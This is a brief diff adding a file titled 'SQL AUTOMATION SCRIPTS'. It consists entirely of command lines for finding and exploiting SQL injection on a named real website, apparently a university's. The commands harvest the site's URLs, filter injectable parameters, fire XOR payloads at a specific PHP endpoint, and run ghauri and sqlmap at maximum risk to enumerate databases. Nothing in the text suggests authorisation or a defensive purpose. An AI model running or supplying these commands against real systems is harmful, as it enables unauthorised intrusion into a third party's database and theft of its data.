@@ -1,0 +1,10 @@
+                           SQL AUTOMATION SCRIPTS
+
+
+echo https://cutm.ac.in/ | gau | urldedupe -qs | gf sqli
+
+python3 main.py -u 'https://cutm.ac.in/payu/skill/index.php?id=49' -p payloads/xor.txt -t 5 -o sqli.txt
+
+ghauri -u 'https://cutm.ac.in/payu/skill/index.php?id=49' --dbs --batch
+
+sqlmap -m parameters.txt --batch --level=5 --risk=3 --dbs
